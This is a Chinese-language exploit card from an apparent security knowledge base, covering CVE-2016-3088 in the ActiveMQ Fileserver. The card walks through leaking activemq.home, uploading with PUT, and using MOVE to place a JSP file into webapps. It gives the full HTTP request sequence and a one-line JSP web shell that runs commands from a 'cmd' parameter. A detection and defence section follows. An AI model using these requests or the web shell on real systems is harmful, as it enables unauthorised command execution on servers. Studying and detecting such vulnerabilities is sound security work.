---
id: web-java-component-activemq-fileserver-put-move-webshell
title: ActiveMQ Fileserver PUT/MOVE 任意文件写入：search 提取 activemq.home 后将 JSP 移入 webapps 致 RCE（CVE-2016-3088）
type: scenario
domain: web
path: web/java/component
technique: activemq-fileserver-put-move-arbitrary-file-write
aliases:
- CVE-2016-3088
- ActiveMQ Fileserver 任意文件写入
- PUT MOVE 写 WebShell
- activemq.home 路径泄露
- fileserver MOVE Destination
tags:
- web
- java
- activemq
- cve
- arbitrary-file-write
- file-upload
- webshell
- rce
cve:
- CVE-2016-3088
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V284
  verified_at: '2026-11-08T05:29:38+08:00'
  notes: 已对照原文（fscan 源码分析中 search 规则示例 POC YAML，第2074-2108行）与唯一图片 img/01（ICMP报文格式，与本卡无关）核对：PUT /fileserver/{{filename}}.txt -> GET /admin/test/index.jsp search activemq.home=(?P<home>.*?), -> MOVE Destination file://{{home}}/webapps/api/{{filename}}.jsp -> GET /api/{{filename}}.jsp 且 response.body.bcontains(fileContent)，与卡片完全一致；CVE-2016-3088、路径 web/java/component（path-check exists）正确。注意：原文仅给出 fscan 内置检测 POC（验证写入+可访问随机串），未实际执行 JSP 代码；卡片明确标注此为检测 POC、实战需换 JSP 内容，属合理延伸。原文未给版本区间，未设 affected_versions 正确。dedup 仅 related（jeeWMS/Tomcat PUT 等同为文件写入但入口/sink 不同）；dup-scan 与 16429 WebLogic JSP 上传为 related，保留。PoC 未复跑。
---

## 一句话结论

ActiveMQ Fileserver 同时接受 PUT 与 MOVE：先用 PUT 把内容写到 `/fileserver/<name>.txt`，再用 MOVE 的 `Destination: file://<activemq.home>/webapps/api/<name>.jsp` 把文件移到 Web 可执行目录，最后访问 `/api/<name>.jsp` 即由 JSP 引擎执行；用于检测的 POC 用随机串作文件内容验证「可写入 + 可访问」，把内容换成 JSP 即成为 WebShell。

## 原理

- Fileserver 的 PUT 把请求体直接落盘到 fileserver 的可写目录；MOVE 则按 `Destination` 头把源文件移动到目标绝对路径，目标路径没有限制在 fileserver 目录内，因此可以跨目录移动到 `webapps` 下。这是 CVE-2016-3088 的核心：文件上传与「移动到任意路径」两个能力叠加，等于任意文件写入。
- 文件名/后缀由 MOVE 的目标路径决定：PUT 阶段落的是 `.txt`（不参与 JSP 解析），MOVE 到 `.jsp` 后文件进入 Jetty 的 JSP 可执行上下文，访问即编译执行。
- 目标绝对路径可由管理控制台的 `/admin/test/index.jsp` 泄露：响应里带有 `activemq.home=...` 形式的信息。POC 用 `search` 正则 `activemq.home=(?P<home>.*?),` 捕获安装目录，再把 `{{home}}` 填进后续 MOVE 的 Destination。
- 拿不到管理页时只能按安装形态推测绝对路径（常见解压目录下的 `webapps`），因此该链路对「路径已知/可泄露」有依赖；POC 的 `search` 变量回填正是为了自动完成这一步。

## 触发条件

- 目标运行存在 Fileserver PUT/MOVE 任意路径写入问题的 ActiveMQ 5.x。
- `/fileserver/` 可访问；POC 未单独写认证头，实际认证要求取决于目标配置（POC 通过全局 Cookie 复用已登录的管理会话）。
- 能读取 `/admin/test/index.jsp`（需管理会话）或以其他方式确定 `activemq.home` 绝对路径。
- ActiveMQ 进程对目标 `webapps` 子目录有写权限（默认安装满足）。

## 利用步骤

1. 带管理会话 GET `/admin/test/index.jsp`，按 `activemq.home=(?P<home>.*?),` 提取安装目录（POC 的 `search` 步骤，失败则该 rule 不通过）。
2. PUT `/fileserver/<name>.txt`，请求体写入测试串或 JSP 内容。
3. 对同一源路径发 MOVE：`Destination: file://<activemq.home>/webapps/api/<name>.jsp`。
4. GET `/api/<name>.jsp` 确认文件已落到 Web 目录并可访问；POC 用 `response.body.bcontains(fileContent)` 校验随机串，实战改为 JSP 代码即命令执行。
5. 若 `/api` 不可写/不可访问，改 Destination 到 `webapps/admin/`、`webapps/` 等其他会被容器解析的目录。

## PoC

最小请求序列（管理控制台默认 8161 端口，Cookie 换成有效管理会话）：

```http
GET /admin/test/index.jsp HTTP/1.1
Host: target:8161
Cookie: <admin session>
```

```http
PUT /fileserver/abc123.txt HTTP/1.1
Host: target:8161
Content-Length: 26

<%= "abc123" %>
```

```http
MOVE /fileserver/abc123.txt HTTP/1.1
Host: target:8161
Destination: file:///opt/apache-activemq/webapps/api/abc123.jsp
```

```http
GET /api/abc123.jsp HTTP/1.1
Host: target:8161
```

检测 POC 只写入随机串并检查响应体包含该串；实际利用把 PUT 内容换成最小执行 JSP，例如：

```jsp
<%= new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream())).readLine() %>
```

## 变体与关联

- 变体：Destination 指向 `webapps/admin/` 或 `webapps/fileserver/` 等目录，取决于目标哪些 Web 目录可写、哪些路径可匿名访问。
- 变体：若管理页无法读取，用报错页、备份文件或默认安装路径枚举 `activemq.home`，再执行 MOVE。
- 关联：[[web-java-deserialization-activemq-46604-proxied-xml-rce]]（同为 ActiveMQ RCE，但入口是 OpenWire 反序列化而非文件写入）。
- 关联：[[web-java-component-activemq-jolokia-http-discovery-second-stage-vm-bypass]]（同为 ActiveMQ Web 层入口的 RCE 利用面）。

## 检测与防御

- 防御：升级到厂商修复版本；不需要 Fileserver 时从 `webapps` 删除/禁用 `fileserver`，并在反向代理/WAF 层拒绝 `/fileserver/` 的 PUT、MOVE 方法。
- 防御：Web 容器禁止把上传目录纳入 JSP 解析；对 `webapps` 下非部署产生的 `.jsp/.jspx` 文件做完整性监控。
- 检测：HTTP 日志中出现 `PUT /fileserver/*`、`MOVE /fileserver/*` 或 MOVE 的 `Destination: file://` 头即高危；关注 `/admin/test/index.jsp` 被访问后紧跟 `/api/*.jsp` 请求的序列。
- 检测：监控 `webapps/` 目录新增文件与 JSP 编译日志，异常时间窗内的新 JSP 访问告警。
